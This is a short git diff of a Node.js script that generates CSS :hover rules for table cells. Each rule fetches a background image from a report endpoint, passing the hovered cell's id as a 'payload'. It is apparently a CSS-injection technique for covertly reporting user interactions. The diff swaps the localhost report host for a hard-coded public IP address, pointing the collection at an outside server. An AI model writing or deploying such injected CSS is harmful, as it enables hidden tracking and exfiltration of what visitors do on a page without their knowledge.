@@ -1,11 +1,11 @@
 let fs = require("fs");
 
 // td[id=t-0] {
-//     background-image: url("http://localhost:3000/report?site=table&type=hover&payload=td[id=t-0]") !important;
+//     background-image: url("http://13.57.38.41:3000/report?site=table&type=hover&payload=td[id=t-0]") !important;
 // }
 
 function genSingleTdListener(id) {
-    return `td[id=${id}]:hover{background-image: url("http://localhost:3000/report?site=table&type=hover&payload=td[id=${id}") !important;}\n`
+    return `td[id=${id}]:hover{background-image: url("http://13.57.38.41:3000/report?site=table&type=hover&payload=td[id=${id}") !important;}\n`
 }
 
 function genAllTdListener(count) {
